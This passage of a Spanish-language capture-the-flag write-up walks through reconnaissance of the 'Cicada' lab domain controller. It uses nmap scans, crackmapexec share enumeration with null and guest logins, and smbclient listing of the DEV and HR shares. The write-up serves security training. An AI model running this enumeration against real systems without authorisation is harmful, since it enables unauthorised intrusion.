+<a id="__codelineno-2-12" name="__codelineno-2-12" href="#__codelineno-2-12"></a><span class="mi">445</span><span class="o">/</span><span class="n">tcp</span><span class="w">   </span><span class="nb">open</span><span class="w">  </span><span class="n">microsoft</span><span class="o">-</span><span class="n">ds</span><span class="w">     </span><span class="n">syn</span><span class="o">-</span><span class="n">ack</span><span class="w"> </span><span class="n">ttl</span><span class="w"> </span><span class="mi">127</span>
+<a id="__codelineno-2-13" name="__codelineno-2-13" href="#__codelineno-2-13"></a><span class="mi">464</span><span class="o">/</span><span class="n">tcp</span><span class="w">   </span><span class="nb">open</span><span class="w">  </span><span class="n">kpasswd5</span><span class="w">         </span><span class="n">syn</span><span class="o">-</span><span class="n">ack</span><span class="w"> </span><span class="n">ttl</span><span class="w"> </span><span class="mi">127</span>
+<a id="__codelineno-2-14" name="__codelineno-2-14" href="#__codelineno-2-14"></a><span class="mi">593</span><span class="o">/</span><span class="n">tcp</span><span class="w">   </span><span class="nb">open</span><span class="w">  </span><span class="n">http</span><span class="o">-</span><span class="n">rpc</span><span class="o">-</span><span class="n">epmap</span><span class="w">   </span><span class="n">syn</span><span class="o">-</span><span class="n">ack</span><span class="w"> </span><span class="n">ttl</span><span class="w"> </span><span class="mi">127</span>
+<a id="__codelineno-2-15" name="__codelineno-2-15" href="#__codelineno-2-15"></a><span class="mi">636</span><span class="o">/</span><span class="n">tcp</span><span class="w">   </span><span class="nb">open</span><span class="w">  </span><span class="n">ldapssl</span><span class="w">          </span><span class="n">syn</span><span class="o">-</span><span class="n">ack</span><span class="w"> </span><span class="n">ttl</span><span class="w"> </span><span class="mi">127</span>
+<a id="__codelineno-2-16" name="__codelineno-2-16" href="#__codelineno-2-16"></a><span class="mi">3269</span><span class="o">/</span><span class="n">tcp</span><span class="w">  </span><span class="nb">open</span><span class="w">  </span><span class="n">globalcatLDAPssl</span><span class="w"> </span><span class="n">syn</span><span class="o">-</span><span class="n">ack</span><span class="w"> </span><span class="n">ttl</span><span class="w"> </span><span class="mi">127</span>
+<a id="__codelineno-2-17" name="__codelineno-2-17" href="#__codelineno-2-17"></a><span class="mi">5985</span><span class="o">/</span><span class="n">tcp</span><span class="w">  </span><span class="nb">open</span><span class="w">  </span><span class="n">wsman</span><span class="w">            </span><span class="n">syn</span><span class="o">-</span><span class="n">ack</span><span class="w"> </span><span class="n">ttl</span><span class="w"> </span><span class="mi">127</span>
+<a id="__codelineno-2-18" name="__codelineno-2-18" href="#__codelineno-2-18"></a><span class="mi">52422</span><span class="o">/</span><span class="n">tcp</span><span class="w"> </span><span class="nb">open</span><span class="w">  </span><span class="n">unknown</span><span class="w">          </span><span class="n">syn</span><span class="o">-</span><span class="n">ack</span><span class="w"> </span><span class="n">ttl</span><span class="w"> </span><span class="mi">127</span>
+<a id="__codelineno-2-19" name="__codelineno-2-19" href="#__codelineno-2-19"></a>
+<a id="__codelineno-2-20" name="__codelineno-2-20" href="#__codelineno-2-20"></a><span class="no">Read</span><span class="w"> </span><span class="n">data</span><span class="w"> </span><span class="n">files</span><span class="w"> </span><span class="ss">from</span><span class="p">:</span> <span class="sr">/usr/s</span><span class="n">hare</span><span class="o">/</span><span class="n">nmap</span>
+</code></pre></div>
+<p>Se identificaron múltiples puertos abiertos, entre ellos algunos ampliamente conocidos asociados a Active Directory, lo que sugiere que este servidor Windows podría estar gestionando dicho servicio.</p>
+<p>Como tengo muchos puertos extraigo del escaneo los puertos, con el siguiente comando y obteniendo el resultado.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="n">cat</span><span class="w"> </span><span class="n">preScan</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">grep</span><span class="w"> </span><span class="s2">&quot;tcp&quot;</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">awk</span><span class="w"> </span><span class="o">-</span><span class="n">F</span><span class="o">/</span><span class="w"> </span><span class="s1">&#39;{print $1}&#39;</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">tail</span><span class="w"> </span><span class="o">-</span><span class="n">n</span><span class="w"> </span><span class="mi">12</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">tr</span><span class="w"> </span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="w"> </span><span class="s1">&#39;,&#39;</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">rev</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">cut</span><span class="w"> </span><span class="o">-</span><span class="n">c</span><span class="w"> </span><span class="mi">2</span><span class="o">-</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">rev</span>
+<a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>
+<a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a><span class="c1"># 53,88,135,139,389,445,464,593,636,3269,5985,52422</span>
+</code></pre></div>
+<p>Escaneo de los servicios y las versiones que están ejecutándose por los diferentes puertos.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="n">sudo</span><span class="w"> </span><span class="n">nmap</span><span class="w"> </span><span class="o">-</span><span class="n">sCV</span><span class="w"> </span><span class="o">-</span><span class="n">p53</span><span class="p">,</span><span class="mi">88</span><span class="p">,</span><span class="mi">135</span><span class="p">,</span><span class="mi">139</span><span class="p">,</span><span class="mi">389</span><span class="p">,</span><span class="mi">445</span><span class="p">,</span><span class="mi">464</span><span class="p">,</span><span class="mi">593</span><span class="p">,</span><span class="mi">636</span><span class="p">,</span><span class="mi">3269</span><span class="p">,</span><span class="mi">5985</span><span class="p">,</span><span class="mi">52422</span><span class="w"> </span><span class="mi">10</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">11</span><span class="o">.</span><span class="mi">35</span><span class="w"> </span><span class="o">-</span><span class="n">oN</span><span class="w"> </span><span class="nb">scan</span>
+</code></pre></div>
+<p>Reporte de salida del escaneo de todos los puertos.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="no">Nmap</span><span class="w"> </span><span class="nb">scan</span><span class="w"> </span><span class="n">report</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="mi">10</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">11</span><span class="o">.</span><span class="mi">35</span>
+<a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="no">Host</span><span class="w"> </span><span class="n">is</span><span class="w"> </span><span class="n">up</span><span class="w"> </span><span class="p">(</span><span class="mi">0</span><span class="o">.</span><span class="mi">14</span><span class="n">s</span><span class="w"> </span><span class="n">latency</span><span class="p">)</span><span class="o">.</span>
+<a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>
+<a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a><span class="no">PORT</span><span class="w">      </span><span class="no">STATE</span><span class="w"> </span><span class="no">SERVICE</span><span class="w">       </span><span class="no">VERSION</span>
+<a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a><span class="mi">53</span><span class="o">/</span><span class="n">tcp</span><span class="w">    </span><span class="nb">open</span><span class="w">  </span><span class="n">domain</span><span class="w">        </span><span class="no">Simple</span><span class="w"> </span><span class="no">DNS</span><span class="w"> </span><span class="no">Plus</span>
+<a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a><span class="mi">88</span><span class="o">/</span><span class="n">tcp</span><span class="w">    </span><span class="nb">open</span><span class="w">  </span><span class="n">kerberos</span><span class="o">-</span><span class="n">sec</span><span class="w">  </span><span class="no">Microsoft</span><span class="w"> </span><span class="no">Windows</span><span class="w"> </span><span class="no">Kerberos</span><span class="w"> </span><span class="p">(</span><span class="n">server</span><span class="w"> </span><span class="ss">time</span><span class="p">:</span><span class="w"> </span><span class="mi">2024</span><span class="o">-</span><span class="mi">10</span><span class="o">-</span><span class="mi">26</span><span class="w"> </span><span class="mi">23</span><span class="p">:</span><span class="mi">49</span><span class="p">:</span><span class="mi">24</span><span class="n">Z</span><span class="p">)</span>
+<a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a><span class="mi">135</span><span class="o">/</span><span class="n">tcp</span><span class="w">   </span><span class="nb">open</span><span class="w">  </span><span class="n">msrpc</span><span class="w">         </span><span class="no">Microsoft</span><span class="w"> </span><span class="no">Windows</span><span class="w"> </span><span class="no">RPC</span>
+<a id="__codelineno-5-8" name="__codelineno-5-8" href="#__codelineno-5-8"></a><span class="mi">139</span><span class="o">/</span><span class="n">tcp</span><span class="w">   </span><span class="nb">open</span><span class="w">  </span><span class="n">netbios</span><span class="o">-</span><span class="n">ssn</span><span class="w">   </span><span class="no">Microsoft</span><span class="w"> </span><span class="no">Windows</span><span class="w"> </span><span class="n">netbios</span><span class="o">-</span><span class="n">ssn</span>
+<a id="__codelineno-5-9" name="__codelineno-5-9" href="#__codelineno-5-9"></a><span class="mi">389</span><span class="o">/</span><span class="n">tcp</span><span class="w">   </span><span class="nb">open</span><span class="w">  </span><span class="n">ldap</span><span class="w">          </span><span class="no">Microsoft</span><span class="w"> </span><span class="no">Windows</span><span class="w"> </span><span class="no">Active</span><span class="w"> </span><span class="no">Directory</span><span class="w"> </span><span class="no">LDAP</span><span class="w"> </span><span class="p">(</span><span class="ss">Domain</span><span class="p">:</span><span class="w"> </span><span class="n">cicada</span><span class="o">.</span><span class="n">htb0</span><span class="o">.</span><span class="p">,</span><span class="w"> </span><span class="ss">Site</span><span class="p">:</span><span class="w"> </span><span class="no">Default</span><span class="o">-</span><span class="no">First</span><span class="o">-</span><span class="no">Site</span><span class="o">-</span><span class="no">Name</span><span class="p">)</span>
+<a id="__codelineno-5-10" name="__codelineno-5-10" href="#__codelineno-5-10"></a><span class="o">|</span><span class="w"> </span><span class="n">ssl</span><span class="o">-</span><span class="ss">cert</span><span class="p">:</span><span class="w"> </span><span class="ss">Subject</span><span class="p">:</span><span class="w"> </span><span class="n">commonName</span><span class="o">=</span><span class="no">CICADA</span><span class="o">-</span><span class="no">DC</span><span class="o">.</span><span class="n">cicada</span><span class="o">.</span><span class="n">htb</span>
+<a id="__codelineno-5-11" name="__codelineno-5-11" href="#__codelineno-5-11"></a><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="no">Subject</span><span class="w"> </span><span class="no">Alternative</span><span class="w"> </span><span class="ss">Name</span><span class="p">:</span><span class="w"> </span><span class="ss">othername</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="o">.</span><span class="mi">3</span><span class="o">.</span><span class="mi">6</span><span class="o">.</span><span class="mi">1</span><span class="o">.</span><span class="mi">4</span><span class="o">.</span><span class="mi">1</span><span class="o">.</span><span class="mi">311</span><span class="o">.</span><span class="mi">25</span><span class="o">.</span><span class="mi">1</span><span class="o">::&lt;</span><span class="n">unsupported</span><span class="o">&gt;</span><span class="p">,</span><span class="w"> </span><span class="ss">DNS</span><span class="p">:</span><span class="no">CICADA</span><span class="o">-</span><span class="no">DC</span><span class="o">.</span><span class="n">cicada</span><span class="o">.</span><span class="n">htb</span>
+<a id="__codelineno-5-12" name="__codelineno-5-12" href="#__codelineno-5-12"></a><span class="o">|</span><span class="w"> </span><span class="no">Not</span><span class="w"> </span><span class="n">valid</span><span class="w"> </span><span class="ss">before</span><span class="p">:</span><span class="w"> </span><span class="mi">2024</span><span class="o">-</span><span class="mi">08</span><span class="o">-</span><span class="mi">22</span><span class="ss">T20</span><span class="p">:</span><span class="mi">24</span><span class="p">:</span><span class="mi">16</span>
+<a id="__codelineno-5-13" name="__codelineno-5-13" href="#__codelineno-5-13"></a><span class="o">|</span><span class="n">_Not</span><span class="w"> </span><span class="n">valid</span><span class="w"> </span><span class="ss">after</span><span class="p">:</span><span class="w">  </span><span class="mi">2025</span><span class="o">-</span><span class="mi">08</span><span class="o">-</span><span class="mi">22</span><span class="ss">T20</span><span class="p">:</span><span class="mi">24</span><span class="p">:</span><span class="mi">16</span>
+<a id="__codelineno-5-14" name="__codelineno-5-14" href="#__codelineno-5-14"></a><span class="o">|</span><span class="n">_ssl</span><span class="o">-</span><span class="ss">date</span><span class="p">:</span><span class="w"> </span><span class="no">TLS</span><span class="w"> </span><span class="n">randomness</span><span class="w"> </span><span class="n">does</span><span class="w"> </span><span class="ow">not</span><span class="w"> </span><span class="n">represent</span><span class="w"> </span><span class="n">time</span>
+<a id="__codelineno-5-15" name="__codelineno-5-15" href="#__codelineno-5-15"></a><span class="mi">445</span><span class="o">/</span><span class="n">tcp</span><span class="w">   </span><span class="nb">open</span><span class="w">  </span><span class="n">microsoft</span><span class="o">-</span><span class="n">ds?</span>
+<a id="__codelineno-5-16" name="__codelineno-5-16" href="#__codelineno-5-16"></a><span class="mi">464</span><span class="o">/</span><span class="n">tcp</span><span class="w">   </span><span class="nb">open</span><span class="w">  </span><span class="n">kpasswd5?</span>
+<a id="__codelineno-5-17" name="__codelineno-5-17" href="#__codelineno-5-17"></a><span class="mi">593</span><span class="o">/</span><span class="n">tcp</span><span class="w">   </span><span class="nb">open</span><span class="w">  </span><span class="n">ncacn_http</span><span class="w">    </span><span class="no">Microsoft</span><span class="w"> </span><span class="no">Windows</span><span class="w"> </span><span class="no">RPC</span><span class="w"> </span><span class="n">over</span><span class="w"> </span><span class="no">HTTP</span><span class="w"> </span><span class="mi">1</span><span class="o">.</span><span class="mi">0</span>
+<a id="__codelineno-5-18" name="__codelineno-5-18" href="#__codelineno-5-18"></a><span class="mi">636</span><span class="o">/</span><span class="n">tcp</span><span class="w">   </span><span class="nb">open</span><span class="w">  </span><span class="n">ssl</span><span class="o">/</span><span class="n">ldap</span><span class="w">      </span><span class="no">Microsoft</span><span class="w"> </span><span class="no">Windows</span><span class="w"> </span><span class="no">Active</span><span class="w"> </span><span class="no">Directory</span><span class="w"> </span><span class="no">LDAP</span><span class="w"> </span><span class="p">(</span><span class="ss">Domain</span><span class="p">:</span><span class="w"> </span><span class="n">cicada</span><span class="o">.</span><span class="n">htb0</span><span class="o">.</span><span class="p">,</span><span class="w"> </span><span class="ss">Site</span><span class="p">:</span><span class="w"> </span><span class="no">Default</span><span class="o">-</span><span class="no">First</span><span class="o">-</span><span class="no">Site</span><span class="o">-</span><span class="no">Name</span><span class="p">)</span>
+<a id="__codelineno-5-19" name="__codelineno-5-19" href="#__codelineno-5-19"></a><span class="o">|</span><span class="n">_ssl</span><span class="o">-</span><span class="ss">date</span><span class="p">:</span><span class="w"> </span><span class="no">TLS</span><span class="w"> </span><span class="n">randomness</span><span class="w"> </span><span class="n">does</span><span class="w"> </span><span class="ow">not</span><span class="w"> </span><span class="n">represent</span><span class="w"> </span><span class="n">time</span>
+<a id="__codelineno-5-20" name="__codelineno-5-20" href="#__codelineno-5-20"></a><span class="o">|</span><span class="w"> </span><span class="n">ssl</span><span class="o">-</span><span class="ss">cert</span><span class="p">:</span><span class="w"> </span><span class="ss">Subject</span><span class="p">:</span><span class="w"> </span><span class="n">commonName</span><span class="o">=</span><span class="no">CICADA</span><span class="o">-</span><span class="no">DC</span><span class="o">.</span><span class="n">cicada</span><span class="o">.</span><span class="n">htb</span>
+<a id="__codelineno-5-21" name="__codelineno-5-21" href="#__codelineno-5-21"></a><span class="o">|</span><span class="w"> </span><span class="no">Subject</span><span class="w"> </span><span class="no">Alternative</span><span class="w"> </span><span class="ss">Name</span><span class="p">:</span><span class="w"> </span><span class="ss">othername</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="o">.</span><span class="mi">3</span><span class="o">.</span><span class="mi">6</span><span class="o">.</span><span class="mi">1</span><span class="o">.</span><span class="mi">4</span><span class="o">.</span><span class="mi">1</span><span class="o">.</span><span class="mi">311</span><span class="o">.</span><span class="mi">25</span><span class="o">.</span><span class="mi">1</span><span class="o">::&lt;</span><span class="n">unsupported</span><span class="o">&gt;</span><span class="p">,</span><span class="w"> </span><span class="ss">DNS</span><span class="p">:</span><span class="no">CICADA</span><span class="o">-</span><span class="no">DC</span><span class="o">.</span><span class="n">cicada</span><span class="o">.</span><span class="n">htb</span>
+<a id="__codelineno-5-22" name="__codelineno-5-22" href="#__codelineno-5-22"></a><span class="o">|</span><span class="w"> </span><span class="no">Not</span><span class="w"> </span><span class="n">valid</span><span class="w"> </span><span class="ss">before</span><span class="p">:</span><span class="w"> </span><span class="mi">2024</span><span class="o">-</span><span class="mi">08</span><span class="o">-</span><span class="mi">22</span><span class="ss">T20</span><span class="p">:</span><span class="mi">24</span><span class="p">:</span><span class="mi">16</span>
+<a id="__codelineno-5-23" name="__codelineno-5-23" href="#__codelineno-5-23"></a><span class="o">|</span><span class="n">_Not</span><span class="w"> </span><span class="n">valid</span><span class="w"> </span><span class="ss">after</span><span class="p">:</span><span class="w">  </span><span class="mi">2025</span><span class="o">-</span><span class="mi">08</span><span class="o">-</span><span class="mi">22</span><span class="ss">T20</span><span class="p">:</span><span class="mi">24</span><span class="p">:</span><span class="mi">16</span>
+<a id="__codelineno-5-24" name="__codelineno-5-24" href="#__codelineno-5-24"></a><span class="mi">3269</span><span class="o">/</span><span class="n">tcp</span><span class="w">  </span><span class="nb">open</span><span class="w">  </span><span class="n">ssl</span><span class="o">/</span><span class="n">ldap</span><span class="w">      </span><span class="no">Microsoft</span><span class="w"> </span><span class="no">Windows</span><span class="w"> </span><span class="no">Active</span><span class="w"> </span><span class="no">Directory</span><span class="w"> </span><span class="no">LDAP</span><span class="w"> </span><span class="p">(</span><span class="ss">Domain</span><span class="p">:</span><span class="w"> </span><span class="n">cicada</span><span class="o">.</span><span class="n">htb0</span><span class="o">.</span><span class="p">,</span><span class="w"> </span><span class="ss">Site</span><span class="p">:</span><span class="w"> </span><span class="no">Default</span><span class="o">-</span><span class="no">First</span><span class="o">-</span><span class="no">Site</span><span class="o">-</span><span class="no">Name</span><span class="p">)</span>
+<a id="__codelineno-5-25" name="__codelineno-5-25" href="#__codelineno-5-25"></a><span class="o">|</span><span class="n">_ssl</span><span class="o">-</span><span class="ss">date</span><span class="p">:</span><span class="w"> </span><span class="no">TLS</span><span class="w"> </span><span class="n">randomness</span><span class="w"> </span><span class="n">does</span><span class="w"> </span><span class="ow">not</span><span class="w"> </span><span class="n">represent</span><span class="w"> </span><span class="n">time</span>
+<a id="__codelineno-5-26" name="__codelineno-5-26" href="#__codelineno-5-26"></a><span class="o">|</span><span class="w"> </span><span class="n">ssl</span><span class="o">-</span><span class="ss">cert</span><span class="p">:</span><span class="w"> </span><span class="ss">Subject</span><span class="p">:</span><span class="w"> </span><span class="n">commonName</span><span class="o">=</span><span class="no">CICADA</span><span class="o">-</span><span class="no">DC</span><span class="o">.</span><span class="n">cicada</span><span class="o">.</span><span class="n">htb</span>
+<a id="__codelineno-5-27" name="__codelineno-5-27" href="#__codelineno-5-27"></a><span class="o">|</span><span class="w"> </span><span class="no">Subject</span><span class="w"> </span><span class="no">Alternative</span><span class="w"> </span><span class="ss">Name</span><span class="p">:</span><span class="w"> </span><span class="ss">othername</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="o">.</span><span class="mi">3</span><span class="o">.</span><span class="mi">6</span><span class="o">.</span><span class="mi">1</span><span class="o">.</span><span class="mi">4</span><span class="o">.</span><span class="mi">1</span><span class="o">.</span><span class="mi">311</span><span class="o">.</span><span class="mi">25</span><span class="o">.</span><span class="mi">1</span><span class="o">::&lt;</span><span class="n">unsupported</span><span class="o">&gt;</span><span class="p">,</span><span class="w"> </span><span class="ss">DNS</span><span class="p">:</span><span class="no">CICADA</span><span class="o">-</span><span class="no">DC</span><span class="o">.</span><span class="n">cicada</span><span class="o">.</span><span class="n">htb</span>
+<a id="__codelineno-5-28" name="__codelineno-5-28" href="#__codelineno-5-28"></a><span class="o">|</span><span class="w"> </span><span class="no">Not</span><span class="w"> </span><span class="n">valid</span><span class="w"> </span><span class="ss">before</span><span class="p">:</span><span class="w"> </span><span class="mi">2024</span><span class="o">-</span><span class="mi">08</span><span class="o">-</span><span class="mi">22</span><span class="ss">T20</span><span class="p">:</span><span class="mi">24</span><span class="p">:</span><span class="mi">16</span>
+<a id="__codelineno-5-29" name="__codelineno-5-29" href="#__codelineno-5-29"></a><span class="o">|</span><span class="n">_Not</span><span class="w"> </span><span class="n">valid</span><span class="w"> </span><span class="ss">after</span><span class="p">:</span><span class="w">  </span><span class="mi">2025</span><span class="o">-</span><span class="mi">08</span><span class="o">-</span><span class="mi">22</span><span class="ss">T20</span><span class="p">:</span><span class="mi">24</span><span class="p">:</span><span class="mi">16</span>
+<a id="__codelineno-5-30" name="__codelineno-5-30" href="#__codelineno-5-30"></a><span class="mi">5985</span><span class="o">/</span><span class="n">tcp</span><span class="w">  </span><span class="nb">open</span><span class="w">  </span><span class="n">http</span><span class="w">          </span><span class="no">Microsoft</span><span class="w"> </span><span class="no">HTTPAPI</span><span class="w"> </span><span class="n">httpd</span><span class="w"> </span><span class="mi">2</span><span class="o">.</span><span class="mi">0</span><span class="w"> </span><span class="p">(</span><span class="no">SSDP</span><span class="o">/</span><span class="no">UPnP</span><span class="p">)</span>
+<a id="__codelineno-5-31" name="__codelineno-5-31" href="#__codelineno-5-31"></a><span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">server</span><span class="o">-</span><span class="ss">header</span><span class="p">:</span><span class="w"> </span><span class="no">Microsoft</span><span class="o">-</span><span class="no">HTTPAPI</span><span class="o">/</span><span class="mi">2</span><span class="o">.</span><span class="mi">0</span>
+<a id="__codelineno-5-32" name="__codelineno-5-32" href="#__codelineno-5-32"></a><span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="ss">title</span><span class="p">:</span><span class="w"> </span><span class="no">Not</span><span class="w"> </span><span class="no">Found</span>
+<a id="__codelineno-5-33" name="__codelineno-5-33" href="#__codelineno-5-33"></a><span class="mi">52422</span><span class="o">/</span><span class="n">tcp</span><span class="w"> </span><span class="nb">open</span><span class="w">  </span><span class="n">msrpc</span><span class="w">         </span><span class="no">Microsoft</span><span class="w"> </span><span class="no">Windows</span><span class="w"> </span><span class="no">RPC</span>
+<a id="__codelineno-5-34" name="__codelineno-5-34" href="#__codelineno-5-34"></a><span class="no">Service</span><span class="w"> </span><span class="ss">Info</span><span class="p">:</span><span class="w"> </span><span class="ss">Host</span><span class="p">:</span><span class="w"> </span><span class="no">CICADA</span><span class="o">-</span><span class="no">DC</span><span class="p">;</span><span class="w"> </span><span class="ss">OS</span><span class="p">:</span><span class="w"> </span><span class="no">Windows</span><span class="p">;</span><span class="w"> </span><span class="ss">CPE</span><span class="p">:</span><span class="w"> </span><span class="ss">cpe</span><span class="p">:</span><span class="sr">/o:microsoft:windows</span>
+<a id="__codelineno-5-35" name="__codelineno-5-35" href="#__codelineno-5-35"></a>
+<a id="__codelineno-5-36" name="__codelineno-5-36" href="#__codelineno-5-36"></a><span class="sr">Host script results:</span>
+<a id="__codelineno-5-37" name="__codelineno-5-37" href="#__codelineno-5-37"></a><span class="sr">| smb2-time: </span>
+<a id="__codelineno-5-38" name="__codelineno-5-38" href="#__codelineno-5-38"></a><span class="sr">|   date: 2024-10-26T23:50:18</span>
+<a id="__codelineno-5-39" name="__codelineno-5-39" href="#__codelineno-5-39"></a><span class="sr">|_  start_date: N/</span><span class="n">A</span>
+<a id="__codelineno-5-40" name="__codelineno-5-40" href="#__codelineno-5-40"></a><span class="o">|</span><span class="w"> </span><span class="n">smb2</span><span class="o">-</span><span class="n">security</span><span class="o">-</span><span class="ss">mode</span><span class="p">:</span><span class="w"> </span>
+<a id="__codelineno-5-41" name="__codelineno-5-41" href="#__codelineno-5-41"></a><span class="o">|</span><span class="w">   </span><span class="mi">3</span><span class="p">:</span><span class="mi">1</span><span class="p">:</span><span class="mi">1</span><span class="p">:</span><span class="w"> </span>
+<a id="__codelineno-5-42" name="__codelineno-5-42" href="#__codelineno-5-42"></a><span class="o">|</span><span class="n">_</span><span class="w">    </span><span class="no">Message</span><span class="w"> </span><span class="n">signing</span><span class="w"> </span><span class="n">enabled</span><span class="w"> </span><span class="ow">and</span><span class="w"> </span><span class="n">required</span>
+<a id="__codelineno-5-43" name="__codelineno-5-43" href="#__codelineno-5-43"></a><span class="o">|</span><span class="n">_clock</span><span class="o">-</span><span class="ss">skew</span><span class="p">:</span><span class="w"> </span><span class="mi">7</span><span class="n">h00m00s</span>
+<a id="__codelineno-5-44" name="__codelineno-5-44" href="#__codelineno-5-44"></a>
+<a id="__codelineno-5-45" name="__codelineno-5-45" href="#__codelineno-5-45"></a><span class="no">Service</span><span class="w"> </span><span class="n">detection</span><span class="w"> </span><span class="n">performed</span><span class="o">.</span><span class="w"> </span><span class="no">Please</span><span class="w"> </span><span class="n">report</span><span class="w"> </span><span class="n">any</span><span class="w"> </span><span class="n">incorrect</span><span class="w"> </span><span class="n">results</span><span class="w"> </span><span class="n">at</span><span class="w"> </span><span class="ss">https</span><span class="p">:</span><span class="sr">//nm</span><span class="n">ap</span><span class="o">.</span><span class="n">org</span><span class="o">/</span><span class="n">submit</span><span class="o">/</span><span class="w"> </span><span class="o">.</span>
+</code></pre></div>
+<p>Se puede observar que algunos servicios están apuntando a un dominio <code>cicada.htb</code>, por lo tanto se procedería a agregarlo a host del sistema para realizar estos reconocimientos, agregamos la IP y el dominio en <code>/etc/hosts</code>.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="m">10</span>.10.11.35<span class="w">  </span>cicada.htb<span class="w"> </span>cicada.htb.local
+</code></pre></div>
+<p>Realizar un escaneo con <strong>crackmapexec</strong>, para sacar algún dominio al que este apuntando el AD.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="n">crackmapexec</span><span class="w"> </span><span class="n">smb</span><span class="w"> </span><span class="mi">10</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">11</span><span class="o">.</span><span class="mi">35</span>
+</code></pre></div>
+<p>se encuentra el dominio que se había visto anteriormente en la exploración de los diferentes puestos que nos informaron que esta apuntando a un dominio de AD.</p>
+<p><img alt="img" src="../img/cicada/img2.png" /></p>
+<p>Probar el siguiente comando, para listar los recursos compartidos en la red del lado del servidor, para poder observar si la maquina esta compartiendo recursos en la red.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="n">crackmapexec</span><span class="w"> </span><span class="n">smb</span><span class="w"> </span><span class="mi">10</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">11</span><span class="o">.</span><span class="mi">35</span><span class="w"> </span><span class="o">--</span><span class="n">shares</span>
+</code></pre></div>
+<p>Se tiene algunos errores al ingresar e intentamos ingresar con algún usuario, en este caso vamos a  intentar con <code>guest</code>:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="n">crackmapexec</span><span class="w"> </span><span class="n">smb</span><span class="w"> </span><span class="mi">10</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">11</span><span class="o">.</span><span class="mi">35</span><span class="w"> </span><span class="o">--</span><span class="n">shares</span><span class="w"> </span><span class="o">-</span><span class="n">u</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span><span class="o">-</span><span class="nb">p</span><span class="w"> </span><span class="s1">&#39;&#39;</span>
+<a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a><span class="n">crackmapexec</span><span class="w"> </span><span class="n">smb</span><span class="w"> </span><span class="mi">10</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">11</span><span class="o">.</span><span class="mi">35</span><span class="w"> </span><span class="o">--</span><span class="n">shares</span><span class="w"> </span><span class="o">-</span><span class="n">u</span><span class="w"> </span><span class="s1">&#39;guest&#39;</span><span class="w"> </span><span class="o">-</span><span class="nb">p</span><span class="w"> </span><span class="s1">&#39;&#39;</span>
+</code></pre></div>
+<p><img alt="img" src="../img/cicada/img3.png" /></p>
+<p>Seguimos enumerando algunos servicios con <code>smbclient</code> para el dominio de <code>cicada.htb</code></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="n">smbclient</span><span class="w"> </span><span class="o">-</span><span class="n">L</span><span class="w"> </span><span class="sr">//</span><span class="n">cicada</span><span class="o">.</span><span class="n">htb</span>
+</code></pre></div>
+<p>Al analizar con <code>smbclient</code>, encontramos dos directorios para analizar que se ven interesantes, los cuales son <code>DEV</code>, <code>HR</code>.</p>
+<p><img alt="img" src="../img/cicada/img4.png" /></p>
+<p>Enumeramos los directorios de DEV y HR para mirar si encontramos algo interesante.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="mi">1</span><span class="o">.</span><span class="w"> </span><span class="n">smbclient</span><span class="w"> </span><span class="o">-</span><span class="n">N</span><span class="w"> </span><span class="sr">//</span><span class="n">cicada</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="no">DEV</span>
+<a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a><span class="mi">2</span><span class="o">.</span><span class="w"> </span><span class="n">smbclient</span><span class="w"> </span><span class="o">-</span><span class="n">N</span><span class="w"> </span><span class="sr">//</span><span class="n">cicada</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="no">HR</span>
